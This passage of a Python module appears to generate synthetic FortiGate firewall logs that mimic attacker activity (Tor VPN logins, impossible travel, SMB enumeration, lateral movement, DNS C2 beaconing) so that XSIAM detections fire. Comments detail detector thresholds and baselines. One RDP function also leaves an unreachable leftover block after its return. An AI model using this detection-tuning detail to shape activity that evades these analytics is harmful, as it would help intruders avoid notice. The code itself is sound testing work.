                "FTNTFGTtunneltype": "ssl-vpn", "FTNTFGTremotegw": attacker_ip,
                "FTNTFGTvpntunnel": "SSL-VPN-Tunnel", "FTNTFGTduration": 0,
                "FTNTFGTsrccountry": country,
                "FTNTFGTeventtime": int(ts * 1_000_000_000),
                "externalId": _session_id(),
                "act": "ssl-login-fail", "outcome": "failed",
                "reason": "sslvpn_login_permission_denied",
                "FTNTFGTlogdesc": "SSL VPN login fail",
                "msg": f"SSL VPN login failed for user {u}",
            }
            logs.append(_format_fortinet_cef(config, "0101039426", "event", "vpn", "warning", f))
    return logs


def _simulate_vpn_impossible_travel(config, session_context=None):
    """Same user, two SUCCESSFUL SSL-VPN tunnels from two continents minutes apart —
    XSIAM "Impossible traveler - VPN": "A user connected to a VPN service from
    multiple remote countries in a short period of time". Test period 3 hours.

    REBUILT 2026-09-17. The previous version:
      * was built on a failed-then-succeeded premise the detector does not describe —
        it keys on CONNECTIONS from multiple countries;
      * labelled 175.45.176.10 (a North Korean netblock) as "China", and FortiGate's
        XIF records the TEXT label as the country;
      * used a fixed "benign" IP that was not the user's own home IP;
      * and, like every FortiGate VPN event, reached XSIAM as EXAMPLECORP\\user.
    Now the first tunnel is from the user's stable home IP and the second from a
    home-pool range on a DIFFERENT continent (session_utils.impossible_travel_ips),
    8-20 minutes later, each labelled with its real country. Both countries are already
    in the org baseline, so this adds ZERO new countries.
    """

    forti_conf = _get_config(config)
    gw_ip      = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    user_info  = get_random_user(session_context, preferred_device_type="workstation") if session_context else None
    user       = user_info["username"] if user_info else "jsmith"
    ip1, _, ip2, _ = impossible_travel_ips(vpn_username(user), config)
    now  = time.time()
    logs = []
    for ip, ts in ((ip1, now - random.randint(8, 20) * 60), (ip2, now)):
        assign = f"10.212.134.{random.randint(100, 200)}"
        f = {
            "src": ip, "dst": gw_ip, "dpt": 443, "proto": "6",
            "suser": user, "FTNTFGTxauthuser": user, "FTNTFGTxauthgroup": "VPN_Users",
            "FTNTFGTtunneltype": "ssl-vpn", "FTNTFGTvpntunnel": "SSL-VPN-Tunnel",
            "FTNTFGTremotegw": ip,
            "FTNTFGTsrccountry": ip_country(ip, config)[1] or "Reserved",
            "FTNTFGTduration": 0,
            "FTNTFGTeventtime": int(ts * 1_000_000_000),
            "externalId": _session_id(),
            "act": "tunnel-up", "outcome": "success",
            "FTNTFGTlogdesc": "SSL VPN tunnel up",
            "FTNTFGTtunnelid": random.randint(100000, 999999),
            "FTNTFGTtunnelip": assign, "FTNTFGTassignip": assign,
            "msg": "SSL tunnel established",
        }
        logs.append(_format_fortinet_cef(config, "0101039424", "event", "vpn", "notice", f))
    return logs


def _simulate_vpn_tor_login(config, session_context=None):
    """Full conversation: TLS handshake + tunnel-up + post-auth internal activity from VPN pool.

    Triggers XSIAM: Suspicious VPN Login / TOR-based Access analytics detection.
    Returns list of log strings (3+ events).
    """

    forti_conf = _get_config(config)
    gw_ip      = forti_conf.get("vpn_gateway_ip", "203.0.113.20")
    # DO NOT "FIX" THIS BACK to random.choice(config['tor_exit_nodes']).
    # Probing the full live exit-node list through the tenant
    # resolved them to 55 DISTINCT COUNTRIES with a rotating long tail
    # (Seychelles, Belize, Nicaragua, Panama, Peru ...).  As the SOURCE IP of a
    # successful VPN login that tail kept marking reserve countries "already
    # seen", permanently silencing the analytic "First successful VPN access
    # from a country in organization".  tor_vpn_ip() restricts the pool to the
    # 182 probed /16 prefixes that resolve ONLY to the genuine Tor-heavy
    # countries (US/DE/NL/FR/RO) — still 930 live nodes, so the HIGH-severity
    # "A Successful VPN connection from TOR" analytic is unaffected.
    tor_ip     = tor_vpn_ip(config, default=_random_external_ip())

    if session_context:
        user_info = get_random_user(session_context, preferred_device_type="workstation")
        user      = user_info["username"] if user_info else "jsmith"
    else:
        umap = (forti_conf.get("user_ip_map") or config.get('shared_user_ip_map', {}))
        user = random.choice(list(umap.keys())) if umap else "jsmith"

    vpn_pool   = forti_conf.get("vpn_pool", "10.212.134.0/24")
    vpn_inside = rand_ip_from_network(ip_network(vpn_pool, strict=False))
    tunnel_id  = random.randint(100000, 999999)
    logs       = []

    # Log 1: TLS handshake (Tor IP → gateway:443)
    tls_fields = _base_traffic_fields(
        config, tor_ip, None, user, gw_ip, None, "6", 443, "accept",
        duration_s=1, dst_country="Reserved"
    )
    tls_fields.update({
        "app": "SSL", "FTNTFGTapp": "SSL", "FTNTFGTappid": 15897,
        "FTNTFGTsrccountry": "Unknown", "FTNTFGTsrccity": "Unknown",
        "msg": f"TLS handshake from Tor IP {tor_ip}",
    })
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", tls_fields))

    # Log 2: VPN tunnel-up
    vpn_fields = {
        "src": tor_ip, "dst": gw_ip, "dpt": 443, "proto": "6",
        "suser": user, "FTNTFGTxauthuser": user,
        "FTNTFGTxauthgroup": "VPN_Users",
        "FTNTFGTtunnelid": tunnel_id, "FTNTFGTtunneltype": "ssl-vpn",
        "FTNTFGTtunnelip": vpn_inside, "FTNTFGTassignip": vpn_inside,
        "FTNTFGTremotegw": tor_ip, "FTNTFGTvpntunnel": "SSL-VPN-Tunnel",
        "FTNTFGTsrccountry": "Unknown", "FTNTFGTsrccity": "Unknown",
        "FTNTFGTsrcregion": "Unknown",
        "FTNTFGTduration": 0, "externalId": _session_id(),
        "act": "tunnel-up", "outcome": "success",
        "FTNTFGTlogdesc": "SSL VPN tunnel up",
        "msg": "SSL tunnel established",
    }
    logs.append(_format_fortinet_cef(config, "0101039424", "event", "vpn", "notice", vpn_fields))

    # Logs 3+: Post-auth internal activity from VPN pool IP
    servers = config.get("internal_servers", ["10.0.10.50"])
    lan_iface = forti_conf.get("interface_lan", "port10")
    post_auth_actions = [
        {"app": "SMB", "port": 445, "appid": 16102, "cat": "File.Sharing"},
        {"app": "RDP", "port": 3389, "appid": 16100, "cat": "Remote.Access"},
        {"app": "HTTPS", "port": 443, "appid": 40568, "cat": "Web.Client"},
        {"app": "SSH", "port": 22, "appid": 15897, "cat": "Remote.Access"},
    ]
    for action in random.sample(post_auth_actions, k=random.randint(1, 3)):
        dst_ip = random.choice(servers)
        pa_fields = {
            "src": vpn_inside, "spt": random.randint(49152, 65535),
            "suser": user, "dst": dst_ip, "dpt": action["port"],
            "proto": "6", "act": "accept",
            "app": action["app"], "FTNTFGTapp": action["app"],
            "FTNTFGTappid": action["appid"], "FTNTFGTappcat": action["cat"],
            "deviceInboundInterface": lan_iface,
            "deviceOutboundInterface": lan_iface,
            "FTNTFGTpolicyid": forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname": forti_conf.get("default_policy_name", "allow-outbound"),
            "FTNTFGTsrccountry": "Reserved", "FTNTFGTdstcountry": "Reserved",
            "FTNTFGTduration": random.randint(5, 300),
            "out": random.randint(1000, 50000), "in": random.randint(1000, 100000),
            "FTNTFGTsentpkt": random.randint(5, 50),
            "FTNTFGTrcvdpkt": random.randint(10, 100),
            "FTNTFGTlogdesc": "Forward traffic",
            "FTNTFGTsrcintfrole": "lan", "FTNTFGTdstintfrole": "lan",
            "externalId": _session_id(), "outcome": "success",
            "msg": f"Post-auth {action['app']} from VPN pool {vpn_inside} -> {dst_ip}:{action['port']}",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", pa_fields))

    return logs


def _simulate_smb_new_host_lateral(config, src_ip, user, shost, session_context=None):
    """SMB connections from one internal workstation to multiple unfamiliar internal hosts.

    Generates 5–10 traffic accept events on TCP/445 to DIFFERENT internal destinations.
    Both interfaces are the LAN interface (internal east-west). The breadth of distinct
    SMB targets from a single source is the XSIAM UEBA detection signal.

    Returns list of CEF log strings.
    """

    forti_conf = _get_config(config)
    lan_iface  = forti_conf.get("interface_lan", "port10")
    n_hosts    = random.randint(5, 10)

    dest_ips = set()
    if session_context:
        for _ in range(30):
            peer = get_random_user(session_context, preferred_device_type="workstation")
            if peer and peer.get("ip") and peer["ip"] != src_ip:
                dest_ips.add(peer["ip"])
            if len(dest_ips) >= n_hosts:
                break
    while len(dest_ips) < n_hosts:
        internal_nets = config.get("internal_networks", ["192.168.1.0/24"])
        try:
            host = rand_ip_from_network(ip_network(random.choice(internal_nets), strict=False))
            if host != src_ip:
                dest_ips.add(host)
        except (AddressValueError, ValueError, IndexError):
            pass

    logs = []
    for dst_ip in list(dest_ips)[:n_hosts]:
        duration_s = random.randint(5, 120)
        fields = {
            "src":                     src_ip,
            "spt":                     random.randint(49152, 65535),
            "shost":                   shost,
            "suser":                   user,
            "dst":                     dst_ip,
            "dpt":                     445,
            "proto":                   "6",
            "app":                     "SMB",
            "act":                     "accept",
            "deviceInboundInterface":  lan_iface,
            "deviceOutboundInterface": lan_iface,
            "FTNTFGTpolicyid":         forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname":       "Allow_Internal_SMB",
            "FTNTFGTsrccountry":       "Reserved",
            "FTNTFGTdstcountry":       "Reserved",
            "FTNTFGTduration":         duration_s,
            "out":                     random.randint(200, 5000),
            "in":                      random.randint(2000, 50000),
            "FTNTFGTsentpkt":          random.randint(2, 20),
            "FTNTFGTrcvdpkt":          random.randint(5, 50),
            "FTNTFGTosname":           random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":           _random_mac(shost),
            "FTNTFGTservice":          "SMB",
            "FTNTFGTlogdesc":          "Forward traffic",
            "FTNTFGTsrcintfrole":      "lan",
            "FTNTFGTdstintfrole":      "lan",
            "externalId":              _session_id(),
            "outcome":                 "success",
            "msg":                     f"SMB connection to new host {src_ip} -> {dst_ip}:445",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields))
    return logs


def _simulate_smb_rare_file_transfer(config, src_ip, user, shost):
    """Large SMB file transfer (100 MB – 1 GB) between internal hosts — data staging signal.

    A single long-duration SMB/445 session with anomalously large 'out' (sent) bytes.
    Both interfaces are LAN. The large data volume on an internal SMB session is the
    XSIAM UEBA detection signal (bulk copy from sensitive share).

    Returns single CEF log string.
    """

    forti_conf       = _get_config(config)
    lan_iface        = forti_conf.get("interface_lan", "port10")
    try:
        from modules.session_utils import rare_known_host
    except ImportError:
        from session_utils import rare_known_host
    # A live workstation in another subnet: rare_internal_host() addresses were never
    # seen anywhere, so they have no baseline for Rare SMB/RDP to compare against.
    dst_ip     = rare_known_host(config, exclude=(src_ip,), avoid_subnet_of=src_ip)   # rarely-receiving host, not hot pool
    file_size  = random.randint(104_857_600, 1_073_741_824)  # 100 MB – 1 GB
    duration_s = random.randint(120, 900)

    fields = {
        "src":                     src_ip,
        "spt":                     random.randint(49152, 65535),
        "shost":                   shost,
        "suser":                   user,
        "dst":                     dst_ip,
        "dpt":                     445,
        "proto":                   "6",
        "app":                     "SMB",
        "act":                     "accept",
        "deviceInboundInterface":  lan_iface,
        "deviceOutboundInterface": lan_iface,
        "FTNTFGTpolicyid":         forti_conf.get("default_policy_id", "1"),
        "FTNTFGTpolicyname":       "Allow_Internal_SMB",
        "FTNTFGTsrccountry":       "Reserved",
        "FTNTFGTdstcountry":       "Reserved",
        "FTNTFGTduration":         duration_s,
        "out":                     file_size,  # large read from file share = staging
        "in":                      random.randint(1000, 50000),
        "FTNTFGTsentpkt":          random.randint(100000, 1000000),
        "FTNTFGTrcvdpkt":          random.randint(1000, 50000),
        "FTNTFGTosname":           random.choice(_SRC_OS_WINDOWS),
        "FTNTFGTsrcmac":           _random_mac(shost),
        "FTNTFGTservice":          "SMB",
        "FTNTFGTlogdesc":          "Forward traffic",
        "FTNTFGTsrcintfrole":      "lan",
        "FTNTFGTdstintfrole":      "lan",
        "externalId":              _session_id(),
        "outcome":                 "success",
        "msg":                     f"Large SMB transfer {file_size // (1024 * 1024)}MB: {src_ip} -> {dst_ip}:445",
    }
    return _format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields)


def _simulate_smb_share_enumeration(config, src_ip, user, shost):
    """Rapid TCP/445 connections to many different internal hosts — share scanning.

    15–40 short-duration accept events on SMB/445 to distinct internal destinations.
    The source explores the network for accessible shares. XSIAM detects the
    high-volume SMB connection pattern from one workstation to many new targets.

    Returns list of CEF log strings.
    """

    forti_conf    = _get_config(config)
    lan_iface     = forti_conf.get("interface_lan", "port10")
    n_targets     = random.randint(15, 40)
    internal_nets = config.get("internal_networks", ["192.168.1.0/24"])

    target_ips = set()
    while len(target_ips) < n_targets:
        try:
            host = rand_ip_from_network(ip_network(random.choice(internal_nets), strict=False))
            if host != src_ip:
                target_ips.add(host)
        except (AddressValueError, ValueError, IndexError):
            pass

    logs = []
    for dst_ip in list(target_ips)[:n_targets]:
        fields = {
            "src":                     src_ip,
            "spt":                     random.randint(49152, 65535),
            "shost":                   shost,
            "suser":                   user,
            "dst":                     dst_ip,
            "dpt":                     445,
            "proto":                   "6",
            "app":                     "SMB",
            "act":                     "accept",  # Allow — volume is detection signal
            "deviceInboundInterface":  lan_iface,
            "deviceOutboundInterface": lan_iface,
            "FTNTFGTpolicyid":         forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname":       "Allow_Internal_SMB",
            "FTNTFGTsrccountry":       "Reserved",
            "FTNTFGTdstcountry":       "Reserved",
            "FTNTFGTduration":         0,
            "out":                     random.randint(40, 200),
            "in":                      random.randint(40, 200),
            "FTNTFGTsentpkt":          1,
            "FTNTFGTrcvdpkt":          0,
            "FTNTFGTosname":           random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":           _random_mac(shost),
            "FTNTFGTservice":          "SMB",
            "FTNTFGTlogdesc":          "Forward traffic",
            "FTNTFGTsrcintfrole":      "lan",
            "FTNTFGTdstintfrole":      "lan",
            "externalId":              _session_id(),
            "outcome":                 "success",
            "msg":                     f"SMB probe {src_ip} -> {dst_ip}:445 (share enumeration)",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields))
    return logs


def _simulate_lateral_movement(config, src_ip, user, shost):
    """
    East-west traffic from one internal host to multiple internal servers.
    Returns list of log strings.
    """

    forti_conf   = _get_config(config)
    servers      = config.get("internal_servers", ["10.0.10.50", "10.0.10.51", "10.0.10.52"])
    targets      = random.sample(servers, k=min(random.randint(3, 6), len(servers)))
    lateral_port = random.choice([445, 22, 3389, 5985, 1433, 8080])
    lan_iface    = forti_conf.get("interface_lan", "port10")
    logs         = []

    for dst_ip in targets:
        act   = random.choices(["accept", "deny"], weights=[70, 30])[0]
        fields = {
            "src":                      src_ip,
            "spt":                      random.randint(49152, 65535),
            "shost":                    shost,
            "suser":                    user,
            "dst":                      dst_ip,
            "dpt":                      lateral_port,
            "proto":                    "6",
            "act":                      act,
            "app":                      {445: "SMB", 22: "SSH", 3389: "RDP",
                                         5985: "WinRM", 1433: "MSSQL", 8080: "HTTP"}.get(lateral_port, "TCP"),
            "deviceInboundInterface":   lan_iface,
            "deviceOutboundInterface":  lan_iface,
            "FTNTFGTpolicyid":          forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname":        forti_conf.get("default_policy_name", "allow-outbound"),
            "FTNTFGTsrccountry":        "Reserved",
            "FTNTFGTdstcountry":        "Reserved",
            "FTNTFGTduration":          random.randint(0, 30),
            "out":                      random.randint(1000, 50000),
            "in":                       random.randint(500, 20000),
            "FTNTFGTsentpkt":           random.randint(5, 50),
            "FTNTFGTrcvdpkt":           random.randint(3, 30),
            "FTNTFGTosname":            random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":            _random_mac(shost),
            "FTNTFGTservice":           _port_to_service(lateral_port),
            "FTNTFGTlogdesc":           "Forward traffic" if act != "deny" else "Forward traffic denied",
            "FTNTFGTsrcintfrole":       "lan",
            "FTNTFGTdstintfrole":       "lan",
            "externalId":               _session_id(),
            "outcome":                  "success" if act == "accept" else "failed",
            "msg":                      f"Lateral {act} to {dst_ip}:{lateral_port}",
        }
        logs.append(_format_fortinet_cef(
            config,
            "0000000013",
            "traffic", "forward",
            "notice",
            fields
        ))
    return logs


def _simulate_new_admin_behavior(config, src_ip, user, shost, session_context=None):
    """One workstation opens administrative sessions to many NEW internal destinations.

    XSIAM's NDR lateral-movement analytics profiles, per source host, the set of
    (destination, administrative port) pairs that host has used before, and alerts
    when the number of previously unseen pairs inside a 12-hour window is
    uncharacteristically high for that host. Breadth over new destinations is the
    signal — repeating destinations the host already reached counts for nothing.

    Emits 13-15 accepted sessions over SSH/TFTP/rexec/telnets, each to a destination
    from the dedicated management segment that no host has reached on an
    administrative port, spread over 1-2 hours so the burst never lands on a single
    timestamp. The source is a real internal workstation with its own traffic
    baseline — a freshly minted address has no profile to deviate from.

    Triggers XSIAM: "New Administrative Behavior".
    """
    if not shost:
        _u, shost = _get_user_and_host_info(config, src_ip, session_context)
        user = user if user and user != "unknown" else _u

    forti_conf = _get_config(config)
    lan_iface  = forti_conf.get("interface_lan", "port10")

    n_sessions = random.randint(13, 15)
    targets    = _next_admin_targets(n_sessions)
    ports      = _admin_port_sequence(n_sessions)

    # A second operator account on part of the run: administrative sweeps are
    # usually run under a shared/secondary credential rather than one identity.
    alt_user = None
    if session_context:
        alt_info = get_random_user(session_context, preferred_device_type="workstation")
        if alt_info and alt_info["username"] != user:
            alt_user = alt_info["username"]

    span_seconds = random.randint(70, 140) * 60
    base_epoch   = time.time() - span_seconds
    step         = (span_seconds - 120) / max(n_sessions - 1, 1)

    logs = []
    for i, (dest_ip, port) in enumerate(zip(targets, ports)):
        service, app, appid, appcat, apprisk = _ADMIN_SERVICE_PORTS[port]
        duration = random.randint(20, 900)
        ev_user  = alt_user if (alt_user and random.random() < 0.3) else user

        # dhost stays unset: these destinations have no resolved name and an address
        # in a hostname field makes XSIAM invent a host by that name.
        fields = _base_traffic_fields(
            config, src_ip, shost, ev_user, dest_ip, None, "6", port, "accept",
            duration_s=duration, src_country="Reserved", dst_country="Reserved",
        )
        # The parse rule derives _time as eventtime - duration, so the session start
        # lands where intended only if the duration is added back here.
        event_epoch = base_epoch + step * i + random.uniform(0, 45)
        fields.update({
            "FTNTFGTeventtime":         int((event_epoch + duration) * 1_000_000_000),
            "app":                      app,
            "FTNTFGTapp":               app,
            "FTNTFGTappid":             appid,
            "FTNTFGTappcat":            appcat,
            "FTNTFGTapprisk":           apprisk,
            "FTNTFGTservice":           service,
            "deviceOutboundInterface":  lan_iface,
            "FTNTFGTsrcintfrole":       "lan",
            "FTNTFGTdstintfrole":       "lan",
            "out":                      random.randint(2000, 90000),
            "in":                       random.randint(2000, 250000),
            "externalId":               _session_id(),
            "msg":                      f"Administrative session {app} {src_ip} -> {dest_ip}:{port}",
        })
        logs.append(_format_fortinet_cef(
            config, "0000000013", "traffic", "forward", "notice", fields))
    return logs


def _simulate_tor_connection(config, src_ip, user, shost):
    """DNS precursor + Tor connection — returns list."""

    tor_nodes  = config.get("tor_exit_nodes", [])
    _tor_entry = None
    if tor_nodes:
        _tor_entry = random.choice(tor_nodes)
        tor_ip = _tor_entry.get("ip", _random_external_ip()) if isinstance(_tor_entry, dict) else _tor_entry
    else:
        tor_ip = _random_external_ip()
    tor_country = _tor_exit_country(_tor_entry)
    tor_port  = random.choices([443, 9001, 9030], weights=[60, 30, 10])[0]
    duration_s = random.randint(60, 3600)

    logs = [_dns_precursor(config, src_ip, user, shost, "torproject.org")]

    fields = _base_traffic_fields(
        config, src_ip, shost, user, tor_ip, None, "6", tor_port, "accept",
        duration_s=duration_s, dst_country=tor_country
    )
    fields.update({
        "out":              random.randint(10000, 100000),
        "in":               random.randint(50000, 500000),
        "FTNTFGTsentpkt":   random.randint(50, 500),
        "FTNTFGTrcvdpkt":   random.randint(200, 2000),
        "app":              "Tor" if tor_port != 443 else "HTTPS",
        "FTNTFGTapp":       "Tor.Browser",
        "FTNTFGTappid":     16390,
        "FTNTFGTappcat":    "Proxy",
        "FTNTFGTapprisk":   "critical",
        "FTNTFGTapplist":   _get_config(config).get("applist", "g-default"),
        "msg":              f"Connection to Tor exit node {tor_ip}:{tor_port}",
    })
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    return logs


try:
    from modules.session_utils import beacon_targets as _beacon_targets
except ImportError:
    from session_utils import beacon_targets as _beacon_targets
# Persists across restarts (state/beacon_targets.json): a source keeps its C2, as a
# real implant does, so recurring-access detectors can see the pair on many days.
_beacon_target_map = _beacon_targets("fortinet_fortigate")


def _simulate_dns_c2_beacon(config, src_ip, user, shost):
    """
    DNS beaconing to suspected C2 resolver_ip — repeated queries (returns list).
    Signal: regularity and volume of DNS queries to same suspicious resolver_ip.
    """
    # Recurring-access detectors need the SAME host on many days; a random pick among
    # ~500 users almost never repeats. One of a few fixed hosts (session_utils.recurring_host).
    try:
        from modules.session_utils import recurring_host
    except ImportError:
        from session_utils import recurring_host
    _h = recurring_host("fortinet_fortigate:dns_c2_beacon")
    if _h:
        src_ip, user, shost = _h

    forti_conf   = _get_config(config)
    # Eight curated DGA names meant a "beacon to an algorithmic domain" detector saw
    # eight labels forever. dga_domain() is effectively unique per draw; the curated
    # pool stays the head via threat_domains.pick.
    dga_domains  = forti_conf.get("dga_beacon_domains",
                                   forti_conf.get("malicious_dns_domains", ["asdfqwerlkj.info"]))
    # Stable resolver_ip + C2 base domain per source so successive runs recur to the same
    # rare destination; only the DGA subdomain varies (genuine beacon behaviour).
    target = _beacon_target_map.get(src_ip)
    if not target:
        target = (rare_external_ip(),
                  threat_domains.pick(config, pool_key="dga_beacon_domains",
                                      section="fortinet_config")
                  if config else random.choice(dga_domains))   # rare resolver_ip
        _beacon_target_map[src_ip] = target
    resolver_ip, base_domain = target
    query_count  = random.randint(15, 40)
    logs         = []

    for _ in range(query_count):
        # Each beacon uses a DGA subdomain of the same C2 domain
        subdomain = f"{uuid.uuid4().hex[:8]}.{base_domain}"
        qtype     = random.choices(["A", "TXT", "MX"], weights=[50, 35, 15])[0]
        fields    = {
            "src":              src_ip,
            "spt":              random.randint(49152, 65535),
            "shost":            shost,
            "suser":            user,
            "dst":              resolver_ip,
            "dpt":              53,
            "proto":            "17",
            "act":              "passthrough",
            "app":              "DNS",
            "FTNTFGTeventtype": "dns-query",
            "FTNTFGTqname":     subdomain,
            "FTNTFGTqtype":     qtype,
            "FTNTFGTqclass":    "IN",
            "FTNTFGTpolicyid":  forti_conf.get("default_policy_id", "1"),
            "FTNTFGTpolicyname": forti_conf.get("default_policy_name", "allow-outbound"),
            "FTNTFGTsrccountry":"Reserved",
            "FTNTFGTdstcountry": random.choice(_EXT_LOCATIONS)["country"],
            "FTNTFGTduration":  0,
            "out":              random.randint(50, 100),
            "in":               random.randint(50, 150),
            "FTNTFGTsentpkt":   1,
            "FTNTFGTrcvdpkt":   1,
            "FTNTFGTosname":    random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":    _random_mac(shost),
            "FTNTFGTservice":   "DNS",
            "FTNTFGTlogdesc":   "DNS response",
            "FTNTFGTsrcintfrole": "lan",
            "FTNTFGTdstintfrole": "wan",
            "externalId":       _session_id(),
            "outcome":          "success",
            "msg":              f"DNS query for suspicious domain {subdomain}",
        }
        logs.append(_format_fortinet_cef(config, "1501054802", "dns", "dns-query", "warning", fields))
    return logs


def _simulate_server_outbound_http(config):
    """DNS precursor + server outbound HTTP — returns list."""

    servers     = config.get("internal_servers", ["10.0.10.50"])
    try:
        from modules.session_utils import stable_subset
    except ImportError:
        from session_utils import stable_subset
    src_ip      = random.choice(stable_subset(servers, "fortinet_fortigate:server_outbound_http") or servers)
    dst_ip      = _beacon_target_map.get(f"srvhttp::{src_ip}") or rare_external_ip()
    _beacon_target_map[f"srvhttp::{src_ip}"] = dst_ip
    geo         = _ext_geo()
    duration_s  = random.randint(5, 120)
    domain      = random.choice(["cdn-update.biz", "api-sync.net", "telemetry-relay.com"])

    logs = [_dns_precursor(config, src_ip, "N/A", None, domain, dst_ip)]

    fields = _base_traffic_fields(
        config, src_ip, None, "N/A", dst_ip, None, "6", 80, "accept",
        duration_s=duration_s, dst_country=geo["country"],
        dst_city=geo["city"], dst_region=geo["region"],
        src_os=random.choice(_SRC_OS_SERVER)
    )
    fields.update({
        "app":              "HTTP",
        "FTNTFGTapp":       "HTTP",
        "FTNTFGTappid":     15893,
        "FTNTFGTappcat":    "Network.Service",
        "FTNTFGTapprisk":   "medium",
        "FTNTFGTsrccountry": "Reserved",
        "FTNTFGTdstcountry": geo["country"],
        "FTNTFGTdstcity":   geo["city"],
        "FTNTFGTdstosname": "Unknown",
        "FTNTFGThttpmethod":"GET",
        "requestClientApplication": random.choice(_SUSPICIOUS_UA),
        "msg":              f"Anomalous outbound HTTP from internal server {src_ip}",
    })
    logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "warning", fields))
    return logs


def _simulate_multi_dest_rdp(config, src_ip, user, shost):
    """RDP from one source to multiple internal hosts — targets the
    'Abnormal RDP connections to multiple hosts' analytic.
    """
    logs = []
    internal_net = random.choice(config.get('internal_networks', ['10.0.0.0/24']))
    destinations = [rand_ip_from_network(ip_network(internal_net)) for _ in range(random.randint(5, 12))]
    for dst in destinations[:6]:
        fields = {
            "src": src_ip, "suser": user, "shost": shost,
            "dst": dst, "dpt": 3389, "proto": "6", "act": "accept",
            "app": "RDP", "FTNTFGTservice": "RDP",
            "out": random.randint(2000, 15000), "in": random.randint(5000, 40000),
            "msg": f"RDP accept from {src_ip} to {dst}:3389",
        }
        logs.append(_format_fortinet_cef(config, "0000000013", "traffic", "forward", "notice", fields))
    return logs
    """
    Workstation RDP to MULTIPLE internal hosts — lateral movement.

    This is a UEBA behavioral detection: a single RDP is background noise, but one
    workstation opening RDP (3389) to many internal hosts it never normally touches —
    most blocked, a few succeeding — is the anomaly (breadth is the signal). Generates
    5-10 RDP connections from the same source to DISTINCT internal destinations.
    Returns list of log strings (multi-event).
    """

    forti_conf = _get_config(config)
    lan_iface  = forti_conf.get("interface_lan", "port10")

    # Distinct internal RDP targets — prefer real workstations from session context.
    targets = []
    if session_context:
        for _ in range(30):
            peer = get_random_user(session_context, preferred_device_type="workstation")
            if peer and peer.get("ip") and peer["ip"] != src_ip and peer["ip"] not in targets:
                targets.append(peer["ip"])
            if len(targets) >= 10:
                break
    servers       = [s for s in config.get("internal_servers", ["10.0.10.51"]) if s != src_ip]
    internal_nets = config.get("internal_networks", ["10.0.10.0/24"])
    n_targets     = random.randint(5, 10)
    while len(targets) < n_targets:
        if servers and random.random() < 0.4:
            cand = random.choice(servers)
        else:
            try:
                cand = rand_ip_from_network(ip_network(random.choice(internal_nets), strict=False))
            except Exception:
                cand = f"10.0.10.{random.randint(20, 250)}"
        if cand != src_ip and cand not in targets:
            targets.append(cand)

    def _rdp_event(dst_ip, act):
        ok = act == "accept"
        fields = {
            "src":                      src_ip,
            "spt":                      random.randint(49152, 65535),
            "shost":                    shost,
            "suser":                    user,
            "dst":                      dst_ip,
            "dpt":                      3389,
            "proto":                    "6",
            "act":                      act,
            "app":                      "RDP",
            "deviceInboundInterface":   lan_iface,
            "deviceOutboundInterface":  lan_iface,
            "FTNTFGTpolicyid":          forti_conf.get("default_policy_id", "1") if ok else "0",
            "FTNTFGTpolicyname":        forti_conf.get("default_policy_name", "allow-outbound") if ok else "implicit-deny",
            "FTNTFGTsrccountry":        "Reserved",
            "FTNTFGTdstcountry":        "Reserved",
            "FTNTFGTduration":          random.randint(10, 3600) if ok else 0,
            "out":                      random.randint(5000, 500000) if ok else 0,
            "in":                       random.randint(10000, 1000000) if ok else 0,
            "FTNTFGTsentpkt":           random.randint(10, 1000) if ok else 1,
            "FTNTFGTrcvdpkt":           random.randint(20, 2000) if ok else 0,
            "FTNTFGTosname":            random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTdstosname":         random.choice(_SRC_OS_WINDOWS),
            "FTNTFGTsrcmac":            _random_mac(shost),
            "FTNTFGTservice":           "RDP",
            "FTNTFGTlogdesc":           "Forward traffic" if ok else "Forward traffic denied",
            "FTNTFGTsrcintfrole":       "lan",
            "FTNTFGTdstintfrole":       "lan",
            "externalId":               _session_id(),
            "outcome":                  "success" if ok else "failed",
            "msg":                      f"RDP {act} from {src_ip} to {dst_ip}:3389",
        }
        return _format_fortinet_cef(config,
            "0000000013",
            "traffic", "forward", "notice", fields)

    logs = []
    for dst_ip in targets:
        # Lateral movement: most RDP attempts blocked; a few reachable hosts succeed.
        act = random.choices(["deny", "accept"], weights=[60, 40])[0]
        logs.append(_rdp_event(dst_ip, act))
    return logs


def _simulate_app_control_block(config, src_ip, user, shost):
    """Outbound connection blocked by application control policy — utm:app-ctrl."""

    forti_conf  = _get_config(config)
    app_entry   = random.choice(_APP_CONTROL_BLOCKS)
    dst_ip      = _random_external_ip()
    geo         = _ext_geo()
    dpt         = random.choice([443, 80, 8080, 6881, 9001])

    fields = _base_traffic_fields(
        config, src_ip, shost, user, dst_ip, None, "6", dpt, "blocked",
        dst_country=geo["country"], dst_city=geo["city"], dst_region=geo["region"]
    )
    fields.update({
        "app":              app_entry["app"],
        "FTNTFGTeventtype": "app-ctrl-all",
        "FTNTFGTapp":       app_entry["app"],
        "FTNTFGTappid":     app_entry["appid"],
        "FTNTFGTappcat":    app_entry["category"],
        "FTNTFGTapprisk":   app_entry["risk"],
        "FTNTFGTapplist":   forti_conf.get("applist", "g-default"),
        "FTNTFGTincidentserialno": str(random.randint(100000000, 1999999999)),
        "FTNTFGTprofile":   forti_conf.get("app_ctrl_profile", "default-app-ctrl"),
        "FTNTFGTlogdesc":   "Application blocked",
        "act":              "blocked",
        "FTNTFGTutmaction": "blocked",
        "FTNTFGTdstcountry": geo["country"],
        "FTNTFGTdstcity":   geo["city"],
        "outcome":          "failed",
        "msg":              f"Application {app_entry['app']} blocked by policy (risk: {app_entry['risk']})",
